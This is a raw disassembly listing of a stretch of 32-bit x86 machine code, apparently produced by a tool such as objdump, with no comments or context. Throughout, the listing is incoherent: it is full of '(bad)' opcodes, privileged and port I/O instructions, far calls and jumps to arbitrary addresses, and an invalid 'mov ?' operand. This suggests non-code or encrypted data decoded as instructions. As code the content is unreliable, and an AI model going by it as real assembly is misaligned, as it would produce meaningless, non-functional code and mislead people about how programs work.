  407836:	fiadd  DWORD PTR [eax+0x48]
  407839:	enter  0x6714,0x4b
  40783d:	rcl    DWORD PTR [eax+edi*4],0x8e
  407841:	stc    
  407842:	sbb    eax,0x3752200
  407847:	sub    al,0xf7
  407849:	das    
  40784a:	and    eax,0x65f3693
  40784f:	fist   WORD PTR [edi]
  407851:	mov    WORD PTR [edi+ebx*2],fs
  407854:	jnp    0x40782c
  407856:	jp     0x407820
  407858:	dec    esi
  407859:	push   esi
  40785a:	dec    edx
  40785b:	test   dl,0x51
  40785e:	mov    edx,0xb31b2bf3
  407863:	xchg   edi,eax
  407864:	nop
  407865:	adc    eax,0x1c36b513
  40786a:	sbb    BYTE PTR [ebp+0x3c],0x2b
  40786e:	mov    esp,0xbe0ef5bf
  407873:	adc    BYTE PTR [ebx+0xd7c249d],bh
  407879:	xchg   edi,eax
  40787a:	mov    DWORD PTR [ecx+ebp*1],edi
  40787d:	dec    esi
  40787e:	hlt    
  40787f:	push   esi
  407880:	idiv   BYTE PTR [edi+0xed568fd]
  407886:	jne    0x40783d
  407888:	jmp    0x9c59a087
  40788d:	int3   
  40788e:	les    ecx,FWORD PTR [edx+0x4f857dc5]
  407894:	arpl   WORD PTR [ecx+ebp*8],di
  407897:	push   0x64
  407899:	mov    WORD PTR [edx+0x40],cs
  40789c:	cli    
  40789d:	sbb    al,0x7b
  40789f:	loopne 0x4078ac
  4078a1:	mov    BYTE PTR [edx],ch
  4078a3:	lock cmp dl,BYTE PTR [ecx-0x39]
  4078a7:	(bad)  {k2}
  4078ac:	call   0x3b7a0e8f
  4078b1:	push   es
  4078b2:	fmul   st,st(5)
  4078b4:	fisubr WORD PTR [eax+eax*4+0x2e]
  4078b8:	in     eax,0x36
  4078ba:	sub    eax,0x66681bc6
  4078bf:	mov    WORD PTR [esi],cs
  4078c1:	push   0xcfcdb1f4
  4078c6:	mov    ecx,0xd538de89
  4078cb:	sahf   
  4078cc:	scas   eax,DWORD PTR es:[edi]
  4078cd:	adc    edi,ebp
  4078cf:	pop    es
  4078d0:	cmp    BYTE PTR [edx],0x8d
  4078d3:	(bad)  
  4078d4:	gs mov al,0xcb
  4078d7:	jb     0x40790a
  4078d9:	jb     0x4078c1
  4078db:	xor    al,0x2b
  4078dd:	loope  0x407924
  4078df:	jno    0x40795a
  4078e1:	inc    edi
  4078e2:	inc    ebp
  4078e3:	add    ecx,DWORD PTR [ebp-0xf4c5529]
  4078e9:	mov    esp,0x5a93a26a
  4078ee:	or     eax,0xdec2c54d
  4078f3:	jle    0x4078e4
  4078f5:	push   ebx
  4078f6:	(bad)  [esi+0x4335ef89]
  4078fc:	add    edi,DWORD PTR [esi+0x2fa85b24]
  407902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407903:	mov    al,0x12
  407905:	mov    esi,0x65683608
  40790a:	cli    
  40790b:	sbb    BYTE PTR [edi+0x5407ac16],dh
  407911:	icebp  
  407912:	sbb    dl,cl
  407914:	ds jmp 0x407958
  407917:	sub    al,0xe0
  407919:	cmc    
  40791a:	in     al,dx
  40791b:	sbb    eax,0xf85ada78
  407920:	pop    DWORD PTR [edi-0x14]
  407923:	pop    esp
  407924:	nop    DWORD PTR [eax+0x1005f67f]
  40792b:	xchg   esp,eax
  40792c:	xor    DWORD PTR [esi+0x14],ebp
  40792f:	push   ss
  407930:	clc    
  407931:	in     eax,0x98
  407933:	pop    esi
  407934:	cmp    ah,BYTE PTR [edi+0x5e]
  407937:	idiv   edi
  407939:	xchg   BYTE PTR [edx],ch
  40793b:	retf   0xf22b
  40793e:	add    DWORD PTR [edx+edx*4-0x5a],edx
  407942:	in     al,dx
  407943:	sahf   
  407944:	mov    eax,0x38abf6ba
  407949:	fnstsw WORD PTR [ebx+0x65]
  40794c:	jge    0x407972
  40794e:	test   BYTE PTR [edi+0x48d9e7ad],0xab
  407955:	adc    dh,BYTE PTR [ecx-0x45e8e8eb]
  40795b:	call   0x7bce:0x2f26abec
  407962:	inc    ebx
  407963:	xchg   ebx,eax
  407964:	int3   
  407965:	sar    BYTE PTR [edi],cl
  407967:	mov    bl,0x3e
  407969:	adc    eax,0xbbe29099
  40796e:	inc    esi
  40796f:	pop    eax
  407970:	inc    edi
  407971:	push   ebx
  407972:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407974:	or     ebx,DWORD PTR [esi+0x5136a1bc]
  40797a:	hlt    
  40797b:	pshufw mm6,QWORD PTR [ebp+0x7d799a2e],0x1
  407983:	dec    edx
  407984:	in     eax,dx
  407985:	pop    esp
  407986:	repnz fcomp QWORD PTR [esi-0x42]
  40798a:	xchg   esp,eax
  40798b:	jb     0x407974
  40798d:	pop    ebx
  40798e:	jns    0x407923
  407990:	and    ah,BYTE PTR [eax]
  407992:	pop    edi
  407993:	sub    DWORD PTR [ebp-0x3f9cc174],edi
  407999:	xchg   esp,eax
  40799a:	stos   DWORD PTR es:[edi],eax
  40799b:	popf   
  40799c:	dec    eax
  40799d:	pop    ds
  40799e:	es jmp 0x6635625c
  4079a4:	jo     0x4079a4
  4079a6:	sti    
  4079a7:	lea    ebx,[esi-0x795510a7]
  4079ad:	xchg   ebp,eax
  4079ae:	call   0x2160:0x387edb9
  4079b5:	jmp    0x407959
  4079b7:	push   ds
  4079b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079b9:	fsubr  st,st(0)
  4079bb:	cmp    esi,DWORD PTR [edi+0x30e1816a]
  4079c1:	cmp    bh,BYTE PTR [ecx-0x2f23a16]
  4079c7:	xor    ah,bh
  4079c9:	push   esi
  4079ca:	lahf   
  4079cb:	sbb    esi,ecx
  4079cd:	(bad)  
  4079ce:	inc    eax
  4079cf:	mov    bh,0x11
  4079d1:	fwait
  4079d2:	sti    
  4079d3:	stos   BYTE PTR es:[edi],al
  4079d4:	xchg   ebp,eax
  4079d5:	cdq    
  4079d6:	inc    ecx
  4079d7:	sub    eax,ecx
  4079d9:	sub    esi,0x2c
  4079dc:	addr16 adc al,0x6f
  4079df:	or     DWORD PTR [edx-0x31],0x67
  4079e3:	mov    edx,0x694f4d92
  4079e8:	or     ebp,ebx
  4079ea:	loop   0x407a37
  4079ec:	push   0x6b009ed3
  4079f1:	mov    ecx,0x811a8fea
  4079f6:	add    DWORD PTR [ecx+0x48db5110],eax
  4079fc:	sub    al,0x2
  4079fe:	jb     0x407a45
  407a00:	(bad)  
  407a01:	mov    ch,0xb8
  407a03:	jmp    0xee7deab3
  407a08:	pop    ds
  407a09:	jecxz  0x407a00
  407a0b:	imul   eax,DWORD PTR [edx+ecx*2-0x4d],0x2812a38f
  407a13:	add    DWORD PTR [ecx-0x6a],0x7e
  407a17:	pop    esi
  407a18:	add    bh,BYTE PTR [esi+0x2a]
  407a1b:	mov    ss,WORD PTR [ebx]
  407a1d:	in     eax,dx
  407a1e:	mov    al,ds:0xa9f0c601
  407a23:	fmul   DWORD PTR [esi]
  407a25:	mov    ecx,0x51c32c17
  407a2a:	bound  ebx,QWORD PTR [ecx-0x44]
  407a2d:	dec    esp
  407a2e:	sub    ebx,edx
  407a30:	mov    ebx,0x5aa6bf79
  407a35:	ins    BYTE PTR es:[edi],dx
  407a36:	les    ebp,FWORD PTR [ebp-0x39]
  407a39:	sbb    eax,0xa218964
  407a3e:	push   edx
  407a3f:	push   cs
  407a40:	idiv   DWORD PTR [ecx+0x5a]
  407a43:	enter  0x215c,0x7c
  407a47:	es aaa 
  407a49:	dec    edi
  407a4a:	adc    cl,bh
  407a4c:	call   0x5c86:0xe02cf0c1
  407a53:	fstp   DWORD PTR [di+0x7c]
  407a57:	inc    edx
  407a58:	mov    ch,0xc6
  407a5a:	addr16 mov esp,0x22e2bdc0
  407a60:	dec    ebp
  407a61:	sub    dh,dl
  407a63:	add    al,0xff
  407a65:	loopne 0x407aa5
  407a67:	(bad)  
  407a68:	retf   0x81be
  407a6b:	enter  0xc393,0xd7
  407a6f:	push   0x6c
  407a71:	out    0x66,al
  407a73:	jb     0x407a9d
  407a75:	fld    QWORD PTR [ebp-0x522b98f3]
  407a7b:	dec    esp
  407a7c:	mov    DWORD PTR [ebp+0x34],ebx
  407a7f:	fcomi  st,st(0)
  407a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a82:	or     al,0xcd
  407a84:	rcr    DWORD PTR [esi],1
  407a86:	mov    BYTE PTR ds:0x6e395fe,ch
  407a8c:	imul   esp,edx,0xb
  407a8f:	and    al,0x51
  407a91:	pop    esp
  407a92:	test   DWORD PTR [eax-0x58],ebx
  407a95:	icebp  
  407a96:	or     ebp,DWORD PTR [ebp+0x3081fdb9]
  407a9c:	pushf  
  407a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a9e:	call   0x75b:0xd4563d54
  407aa5:	out    dx,al
  407aa6:	cmp    eax,0x560228e4
  407aab:	xor    dl,BYTE PTR [edx-0xc3b859b]
  407ab1:	cdq    
  407ab2:	xchg   edi,eax
  407ab3:	(bad)  
  407ab5:	nop
  407ab6:	popa   
  407ab7:	pop    edx
  407ab8:	fsubr  DWORD PTR [edi-0x42]
  407abb:	das    
  407abc:	fisubr WORD PTR [esi-0x67]
  407abf:	xor    ah,bh
  407ac1:	cs xchg esi,eax
  407ac3:	pop    es
  407ac4:	add    ecx,esi
  407ac6:	jge    0x407aa3
  407ac8:	sbb    cl,BYTE PTR [eax+0x12]
  407acb:	sub    bh,dl
  407acd:	cwde   
  407ace:	retf   0x5c5c
  407ad1:	cmp    bh,ah
  407ad3:	loop   0x407b3f
  407ad5:	or     eax,0x2d6e5b3f
  407ada:	or     cl,BYTE PTR [esp+edx*4-0x262dadb9]
  407ae1:	mov    ds:0x7987900f,eax
  407ae6:	adc    DWORD PTR [edi],eax
  407ae8:	lea    ebp,[esi+0x63]
  407aeb:	sbb    BYTE PTR [edi],ch
  407aed:	mov    ?,WORD PTR [ecx]
  407aef:	sbb    esp,ebp
  407af1:	inc    esp
  407af2:	inc    edx
  407af3:	jbe    0x407a7b
  407af5:	xchg   esp,eax
  407af6:	jb     0x407ab3
  407af8:	(bad)  
  407afa:	in     eax,0xa9
  407afc:	and    BYTE PTR [ebp+0x33807301],cl
  407b02:	push   ss
  407b03:	hlt    
  407b04:	ret    0x929d
  407b07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b08:	sub    ebx,0xffffffb1
  407b0b:	inc    eax
  407b0c:	push   eax
  407b0d:	jbe    0x407b81
  407b0f:	xrelease xchg BYTE PTR [ebp-0xa],al
  407b13:	inc    esp
  407b14:	push   ebp
  407b15:	sahf   
  407b16:	sub    bl,dl
  407b18:	setle  BYTE PTR [edi-0x65]
  407b1c:	cwde   
  407b1d:	add    edi,DWORD PTR [ecx+edi*1-0x2b526dc9]
  407b24:	imul   ecx,DWORD PTR [edi-0x50],0xffffffea
  407b28:	xchg   esp,eax
  407b29:	mov    ds:0x10a652b2,eax
  407b2e:	fiadd  DWORD PTR [ebx+ebp*2+0xd0fdf1b]
  407b35:	cli    
  407b36:	(bad)  
  407b37:	es call 0x2e99:0x25edb882
  407b3f:	and    al,0x6b
  407b41:	dec    ebp
  407b42:	cld    
  407b43:	dec    edi
  407b44:	push   ss
  407b45:	pop    edi
  407b46:	clc    
  407b47:	and    ah,BYTE PTR [eax-0x15]
  407b4a:	out    0xf9,eax
  407b4c:	inc    esp
  407b4d:	sub    DWORD PTR [edx],0xffffffc2
  407b50:	js     0x407b6e
  407b52:	jmp    0x407bb9
  407b54:	clc    
  407b55:	dec    esi
  407b56:	mov    bh,0xe1
  407b58:	or     edx,esi
  407b5a:	sub    BYTE PTR [eax+0x26be923b],bl
  407b60:	ja     0x407b57
  407b62:	mov    al,ds:0x2635329d
  407b67:	dec    edi
  407b68:	sti    
  407b69:	hlt    
  407b6a:	das    
  407b6b:	std    
  407b6c:	stc    
  407b6d:	lds    edx,FWORD PTR [esi+0x5ebcb27b]
  407b73:	bound  eax,QWORD PTR [esi+edi*4+0x32]
  407b77:	or     esi,edi
  407b79:	je     0x407b4f
  407b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b7c:	je     0x407b20
  407b7e:	xchg   BYTE PTR [esi],ah
  407b80:	jecxz  0x407bb0
  407b82:	shl    BYTE PTR [edi],1
  407b84:	fwait
  407b85:	mov    ds:0xc29bfc4,al
  407b8a:	xchg   ebx,eax
  407b8b:	push   edi
  407b8c:	dec    eax
  407b8d:	push   ecx
  407b8e:	sub    edx,edx
  407b90:	sub    DWORD PTR [esi+0x6821f3b6],ecx
  407b96:	imul   edx,DWORD PTR [edx+0x537ed11],0xeeb5a9d9
  407ba0:	jno    0x407b2f
  407ba2:	inc    ebp
  407ba3:	mov    BYTE PTR [edx+edi*8+0x21],0x70
  407ba8:	into   
  407ba9:	rsm    
  407bab:	ds xchg ebx,eax
  407bad:	(bad)  
  407bae:	cmp    ebx,DWORD PTR [esi]
  407bb0:	popa   
  407bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bb2:	shl    bl,1
  407bb4:	fbld   TBYTE PTR [esi+0x5a5cdc29]
  407bba:	jle    0x407bc8
  407bbc:	mov    eax,ds:0x560f59aa
  407bc1:	stos   BYTE PTR es:[edi],al
  407bc2:	fcom   QWORD PTR [ecx+0x32736755]
  407bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bc9:	fild   QWORD PTR [eax]
  407bcb:	sbb    ah,ch
  407bcd:	inc    esi
  407bce:	into   
  407bcf:	and    BYTE PTR [edi],al
  407bd1:	cmp    eax,0x67f9889f
  407bd6:	std    
  407bd7:	pusha  
  407bd8:	lods   al,BYTE PTR ds:[esi]
  407bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bda:	cli    
  407bdb:	mov    DWORD PTR [ebx+0x1a],ecx
  407bde:	dec    eax
  407bdf:	add    edx,ecx
  407be1:	scas   al,BYTE PTR es:[edi]
  407be2:	jmp    0x407c31
  407be4:	imul   ebp,DWORD PTR [ebp+0x5e],0xffffff95
  407be8:	ror    BYTE PTR [edi],1
  407bea:	out    dx,al
  407beb:	pop    esi
  407bec:	das    
  407bed:	push   ss
  407bee:	scas   al,BYTE PTR es:[edi]
  407bef:	pop    edx
  407bf0:	mov    ds:0xa47054d6,al
  407bf5:	mov    ebp,edi
  407bf7:	adc    DWORD PTR [ebx-0x65c55861],esp
  407bfd:	loop   0x407c5a
  407bff:	lods   eax,DWORD PTR ds:[esi]
  407c00:	push   esi
  407c01:	adc    ch,al
  407c03:	ficomp WORD PTR [ebp-0x20a80717]
  407c09:	jbe    0x407bd8
  407c0b:	adc    dl,BYTE PTR [ebx-0x728c0484]
  407c11:	ss jae 0x407bd6
  407c14:	and    eax,DWORD PTR [eax-0x26]
  407c17:	pusha  
  407c18:	jnp    0x407c35
  407c1a:	add    DWORD PTR [ecx],eax
  407c1c:	addr16 cld 
  407c1e:	xchg   DWORD PTR [ebx],eax
  407c20:	xor    al,ah
  407c22:	add    dl,bl
  407c24:	sub    al,0xa3
  407c26:	repnz pop ds
  407c28:	and    al,0x12
  407c2a:	(bad)  
  407c2b:	pop    esi
  407c2c:	ror    esi,cl
  407c2e:	xchg   ebx,eax
  407c2f:	daa    
  407c30:	push   esi
  407c31:	test   eax,0xfa2fd3be
  407c36:	dec    edx
  407c37:	shr    BYTE PTR [edx],cl
  407c39:	stc    
  407c3a:	shl    ch,0xf6
  407c3d:	retf   0xb63d
  407c40:	outs   dx,BYTE PTR ds:[esi]
  407c41:	dec    esp
  407c42:	(bad)  
  407c43:	fist   DWORD PTR [ecx+0x35]
  407c46:	sbb    eax,0x7c72b91b
  407c4b:	dec    edx
  407c4c:	xor    edi,DWORD PTR [ebp+0x441d88a3]
  407c52:	mov    bh,0xe9
  407c54:	push   ebx
  407c55:	pop    edx
  407c56:	retf   
  407c57:	lock add DWORD PTR [esi],eax
  407c5a:	or     BYTE PTR [edi],bl
  407c5c:	into   
  407c5d:	sbb    eax,0xdc25ba56
  407c62:	aas    
  407c63:	mov    edi,0x245b6985
  407c68:	fsub   st(1),st
  407c6a:	jnp    0x407c2b
  407c6c:	aaa    
  407c6d:	push   esp
  407c6e:	and    al,BYTE PTR [esi+0x593f0bfe]
  407c74:	push   edi
  407c75:	jbe    0x407c16
  407c77:	in     al,0xe5
  407c79:	call   0xd62a:0xeb2beceb
  407c80:	inc    ebx
  407c81:	and    cl,BYTE PTR [esi+0x69]
  407c84:	leave  
  407c85:	pushf  
  407c86:	dec    ebx
  407c87:	xchg   esp,eax
  407c88:	sbb    cl,BYTE PTR [ecx+0x5]
  407c8b:	push   cs
  407c8c:	or     esi,ebp
  407c8e:	adc    ecx,edx
  407c90:	pusha  
  407c91:	jae    0x407c69
  407c93:	dec    edi
  407c94:	sub    BYTE PTR [edi+0x6d],bl
  407c97:	dec    eax
  407c98:	mov    ds:0xb6e03bd8,al
  407c9d:	fs xchg esp,eax
  407c9f:	test   DWORD PTR [ebx],0x6450b08f
  407ca5:	fcomi  st,st(5)
  407ca7:	push   0x6adc6b73
  407cac:	jnp    0x407c79
  407cae:	cmp    BYTE PTR [ecx+0x16],bh
  407cb1:	sub    edx,DWORD PTR [edi-0x1a]
  407cb4:	add    cl,dh
  407cb6:	jne    0x407d20
  407cb8:	xor    BYTE PTR fs:0x7297bdac,cl
  407cbf:	aaa    
  407cc0:	dec    ecx
  407cc1:	mov    ds:0x6b9d76ed,al
  407cc6:	rcl    al,1
  407cc8:	dec    ebx
  407cc9:	lea    edx,[ecx+0x5d]
  407ccc:	sub    dl,al
  407cce:	cld    
  407ccf:	sub    BYTE PTR [edx+eax*2-0x744bf62],cl
  407cd6:	mov    ebx,0x8c0ac6c5
  407cdb:	pop    eax
  407cdc:	mul    BYTE PTR [edx+0x19]
  407cdf:	sbb    ah,BYTE PTR [esp+ebx*4+0x6d]
  407ce3:	mov    ch,0x22
  407ce5:	(bad)  
  407ce6:	into   
  407ce7:	dec    ebp
  407ce8:	add    DWORD PTR [eax],edx
  407cea:	inc    ebp
  407ceb:	push   ebp
  407cec:	push   eax
  407ced:	jb     0x407d01
  407cef:	aam    0x6c
  407cf1:	js     0x407cd7
  407cf3:	lock fbstp TBYTE PTR [ebp-0x459ad389]
  407cfa:	ins    DWORD PTR es:[edi],dx
  407cfb:	stc    
  407cfc:	sub    bh,BYTE PTR ds:[esi+0x1d5b79b3]
  407d03:	jb     0x407cc9
  407d05:	bound  eax,QWORD PTR [edi-0x2f9bdba5]
  407d0b:	jno    0x407cfb
  407d0d:	ins    DWORD PTR es:[edi],dx
  407d0e:	and    ecx,DWORD PTR [edi+0x3e]
  407d11:	push   ebp
  407d12:	mov    dl,0xa3
  407d14:	xor    ch,bh
  407d16:	pop    edi
  407d17:	xor    dl,BYTE PTR [esi+0x526dc38c]
  407d1d:	jle    0x407d88
  407d1f:	add    ebp,eax
  407d21:	xor    ch,BYTE PTR [ebx+0x7c9aa7a9]
  407d27:	or     bl,BYTE PTR [esi-0x5f21ec53]
  407d2d:	mov    al,ds:0xc87fb847
  407d32:	int    0xdd
  407d34:	test   ebx,eax
  407d36:	jle    0x407d5e
  407d38:	push   eax
  407d39:	test   DWORD PTR ds:0xe6d8dd8e,eax
  407d3f:	stos   DWORD PTR es:[edi],eax
  407d40:	in     eax,0x16
  407d42:	xor    bh,al
  407d44:	add    edi,ecx
  407d46:	loop   0x407ce8
  407d48:	and    edi,DWORD PTR [esi+0x6b46c55b]
  407d4e:	mov    DWORD PTR [edx-0x72074971],ecx
  407d54:	aad    0x4c
  407d56:	nop
  407d57:	mov    ebx,0xd78b74
  407d5c:	imul   edi,DWORD PTR [edx],0xca1d74e6
  407d62:	cwde   
  407d63:	mov    edx,esi
  407d65:	imul   edi,DWORD PTR [esp+ebp*1+0x78],0x3e1ea014
  407d6d:	stos   BYTE PTR es:[edi],al
  407d6e:	daa    
  407d6f:	jl     0x407d41
  407d71:	mov    al,0x5b
  407d73:	dec    ecx
  407d74:	popa   
  407d75:	cmc    
  407d76:	aaa    
  407d77:	push   ss
  407d78:	xchg   edx,eax
  407d79:	jmp    0x407d07
  407d7b:	test   BYTE PTR [ecx-0x1f],cl
  407d7e:	xchg   esi,eax
  407d7f:	xchg   edx,eax
  407d80:	and    BYTE PTR [ebx+0x67],cl
  407d83:	xchg   ebp,eax
  407d84:	or     al,BYTE PTR [edi]
  407d86:	add    al,0x9f
  407d88:	mov    bh,0xce
  407d8a:	cmp    ecx,esi
  407d8c:	popa   
  407d8d:	fwait
  407d8e:	lea    eax,[edi]
  407d90:	xlat   BYTE PTR ds:[ebx]
  407d91:	stc    
  407d92:	stos   BYTE PTR es:[edi],al
  407d93:	js     0x407d47
  407d95:	dec    esp
  407d96:	adc    ch,BYTE PTR [ecx-0xd]
  407d99:	mov    edx,0xf1b72e66
  407d9e:	xor    bh,cl
  407da0:	xchg   bh,bh
  407da2:	fdivr  QWORD PTR [ecx-0x76]
  407da5:	mov    eax,ds:0x1aefba8f
  407daa:	aam    0x26
  407dac:	adc    eax,DWORD PTR ds:0xc6a4e4d5
  407db2:	mov    esp,0x2c7f18f4
  407db7:	inc    eax
  407db8:	jle    0x407db5
  407dba:	mov    es,WORD PTR [edx-0x2c99f34a]
  407dc0:	hlt    
  407dc1:	lods   al,BYTE PTR ds:[esi]
  407dc2:	dec    edx
  407dc3:	pop    esp
  407dc4:	into   
  407dc5:	rcl    ecx,1
  407dc7:	add    BYTE PTR [edx],0xe4
  407dca:	(bad)  
  407dcb:	cmp    edx,DWORD PTR [edx+eax*2]
  407dce:	ds test al,0x91
  407dd1:	(bad)  
  407dd2:	xlat   BYTE PTR ds:[ebx]
  407dd3:	mov    esp,DWORD PTR [ecx+ebx*1-0x4e5d0f11]
  407dda:	pop    ds
  407ddb:	daa    
  407ddc:	xchg   edx,eax
  407ddd:	sti    
  407dde:	add    edx,ecx
  407de0:	cdq    
  407de1:	adc    esp,eax
  407de3:	mov    ebx,edi
  407de5:	iret   
  407de6:	out    0xce,al
  407de8:	push   es
  407de9:	pop    ebp
  407dea:	add    DWORD PTR [ebp-0x3fe97a40],esp
  407df0:	cli    
  407df1:	push   esi
  407df2:	mov    DWORD PTR [ebp-0x74],eax
  407df5:	pop    edi
  407df6:	out    dx,eax
  407df7:	jb     0x407e35
  407df9:	jno    0x407e3a
  407dfb:	out    0xb2,al
  407dfd:	mov    ds:0x339e6e67,al
  407e02:	and    al,0x10
  407e04:	xchg   ecx,eax
  407e05:	pop    esp
  407e06:	and    edi,ebx
  407e08:	sub    BYTE PTR [esi+0x550eb74d],ah
  407e0e:	and    ch,BYTE PTR [edi]
  407e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e11:	jecxz  0x407e2d
  407e13:	lds    eax,FWORD PTR ds:0xb5492916
  407e19:	(bad)  
  407e1a:	pop    ss
  407e1b:	call   0x89a5b870
  407e20:	popa   
  407e21:	xchg   edx,eax
  407e22:	or     al,BYTE PTR [edx-0x6c]
  407e25:	outs   dx,BYTE PTR ds:[esi]
  407e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e27:	repnz hlt 
  407e29:	sub    DWORD PTR [ebx],0xdaf85eb2
  407e2f:	push   ecx
  407e30:	and    BYTE PTR [edi-0x7ed4ea3f],0xc7
  407e37:	mov    bh,0x52
  407e39:	adc    DWORD PTR [ecx+0x7466699a],eax
  407e3f:	arpl   bp,cx
  407e41:	in     eax,dx
  407e42:	ins    BYTE PTR es:[edi],dx
  407e43:	cwde   
  407e44:	mov    DWORD PTR [ebx+esi*1],ecx
  407e47:	mov    BYTE PTR [eax-0x6e],dl
  407e4a:	sbb    edi,DWORD PTR [ecx]
  407e4c:	dec    ebp
  407e4d:	sub    dh,BYTE PTR [edx-0x7e]
  407e50:	iret   
  407e51:	jp     0x407de4
  407e53:	xchg   esp,eax
  407e54:	ins    BYTE PTR es:[edi],dx
  407e55:	repz xor ch,ah
  407e58:	dec    ecx
  407e59:	mov    eax,ds:0x62104fc1
  407e5e:	jle    0x407e51
  407e60:	loop   0x407ec0
  407e62:	jns    0x407e72
  407e64:	adc    ebp,DWORD PTR [ebp-0x44924387]
  407e6a:	push   esp
  407e6b:	push   ecx
  407e6c:	popa   
  407e6d:	xchg   edx,eax
  407e6e:	rol    DWORD PTR [eax+ebp*8],1
  407e71:	push   cs
  407e72:	cld    
  407e73:	sbb    ecx,DWORD PTR [edx]
  407e75:	sti    
  407e76:	jne    0x407e75
  407e78:	pop    ebx
  407e79:	and    ecx,DWORD PTR [ebx+0x2fe19de6]
  407e7f:	xor    BYTE PTR [edx],0x44
  407e82:	outs   dx,BYTE PTR ds:[esi]
  407e83:	ds add al,0x2e
  407e86:	sub    al,0xa3
  407e88:	push   es
  407e89:	mov    bl,0xac
  407e8b:	test   BYTE PTR [edi+0x14881825],cl
  407e91:	dec    eax
  407e92:	mov    esi,0x1d2d3c03
  407e97:	jmp    ebp
  407e99:	cmp    dh,BYTE PTR [ecx-0x61bad605]
  407e9f:	dec    ebx
  407ea0:	and    DWORD PTR [ecx],ecx
  407ea2:	aaa    
  407ea3:	or     ebx,DWORD PTR [edi+0x23]
  407ea6:	or     eax,DWORD PTR [eax+eax*8+0x67]
  407eaa:	int3   
  407eab:	push   ebp
  407eac:	xchg   ecx,eax
  407ead:	sub    BYTE PTR [edx-0x185a34d6],bh
  407eb3:	aaa    
  407eb4:	push   ss
  407eb5:	(bad)  
  407eb6:	int3   
  407eb7:	das    
  407eb8:	mov    bl,0x7b
  407eba:	fsub   st,st(2)
  407ebc:	mov    al,0x34
  407ebe:	mov    DWORD PTR [esi+0x7a],ecx
  407ec1:	push   ds
  407ec2:	jmp    0x52e3820e
  407ec7:	adc    ebx,DWORD PTR [esi]
  407ec9:	xchg   esp,eax
  407eca:	sar    BYTE PTR [ebp+0x41d2c007],1
  407ed0:	mov    ds:0xaa5e7cd0,al
  407ed5:	sub    esp,eax
  407ed7:	sbb    BYTE PTR [ecx-0x5b381412],bl
  407edd:	sbb    esi,ebp
  407edf:	inc    edi
  407ee0:	mov    ch,0x89
  407ee2:	push   0x20
  407ee4:	gs pop es
  407ee6:	psubusw mm5,QWORD PTR [ebp+0xb]
  407eea:	les    edi,FWORD PTR [edi-0x201274bc]
  407ef0:	xchg   ecx,eax
  407ef1:	lea    eax,[edi+ebx*2+0x3a]
  407ef5:	adc    ecx,DWORD PTR [esi]
  407ef7:	jb     0x407f66
  407ef9:	in     al,0x1a
  407efb:	dec    ebp
  407efc:	sbb    al,0x83
  407efe:	adc    ecx,DWORD PTR [esi+ebx*4-0x17]
  407f02:	cld    
  407f03:	lods   al,BYTE PTR ds:[esi]
  407f04:	cmp    eax,0xb60dbca5
  407f09:	fistp  WORD PTR [eax+ebp*4+0x663b2b9a]
  407f10:	aas    
  407f11:	adc    dl,dl
  407f13:	jo     0x407efa
  407f15:	aas    
  407f16:	in     al,dx
  407f17:	ja     0x407f6c
  407f19:	adc    eax,DWORD PTR [ecx+0x517dde96]
  407f1f:	xor    BYTE PTR [ebx-0x5d],bh
  407f22:	daa    
  407f23:	outs   dx,DWORD PTR ds:[esi]
  407f24:	xor    ch,BYTE PTR [edx+eax*4]
  407f27:	push   ds
  407f28:	add    ebx,DWORD PTR gs:[ebp+0x1435d5a0]
  407f2f:	or     eax,0x5897bffe
  407f34:	test   DWORD PTR [ecx-0x5e],esp
  407f37:	aas    
  407f38:	mov    dl,0x94
  407f3a:	out    dx,al
  407f3b:	jl     0x407ed6
  407f3d:	cmp    eax,0x73e720eb
  407f42:	mov    ah,0xa2
  407f44:	mov    esp,es
  407f46:	pusha  
  407f47:	and    al,0xcb
  407f49:	mov    bh,0xe1
  407f4b:	sub    al,0x6
  407f4d:	adc    BYTE PTR [ecx-0x57],al
  407f50:	xchg   ebp,eax
  407f51:	in     eax,dx
  407f52:	fnsave [ecx+0x4d24adc4]
  407f58:	mov    ds:0xfec628ec,al
  407f5d:	jmp    0x407f24
  407f5f:	into   
  407f60:	ins    BYTE PTR es:[edi],dx
  407f61:	fiadd  WORD PTR [ebx+0x1ce2952d]
  407f67:	mov    esi,0x2336577d
  407f6c:	jp     0x407eff
  407f6e:	int3   
  407f6f:	icebp  
  407f70:	in     eax,0xf7
  407f72:	mov    bh,0x31
  407f74:	push   ds
  407f75:	test   BYTE PTR [edx],ch
  407f77:	scas   eax,DWORD PTR es:[edi]
  407f78:	addr16 mov al,0xa0
  407f7b:	mov    bl,0xea
  407f7d:	ret    0xb78e
  407f80:	xor    ebx,DWORD PTR [edi-0x7a]
  407f83:	push   ebx
  407f84:	or     BYTE PTR [ebx],bh
  407f86:	nop
  407f87:	xchg   esi,eax
  407f88:	xor    bh,cl
  407f8a:	inc    eax
  407f8b:	ds push ebx
  407f8d:	adc    al,0xd4
  407f8f:	(bad)  
  407f90:	js     0x407fae
  407f92:	in     eax,0x8b
  407f94:	popa   
  407f95:	loope  0x407fb9
  407f97:	xor    bl,BYTE PTR [edx]
  407f99:	jns    0x407fe3
  407f9b:	lea    eax,[ecx+0x57]
  407f9e:	leave  
  407f9f:	loopne 0x407fe5
  407fa1:	push   dx
  407fa3:	sbb    DWORD PTR [edi],edx
  407fa5:	fucom  st(0)
  407fa7:	cld    
  407fa8:	sbb    edi,DWORD PTR [ebp-0x2a]
  407fab:	cmp    DWORD PTR [ecx],edi
  407fad:	nop
  407fae:	stos   BYTE PTR es:[edi],al
  407faf:	push   ss
  407fb0:	mov    ebx,0x3ae39c01
  407fb5:	add    al,0x95
  407fb7:	fsubr  QWORD PTR [edi]
  407fb9:	iret   
  407fba:	add    ebp,ecx
  407fbc:	jmp    0x408020
  407fbe:	inc    ecx
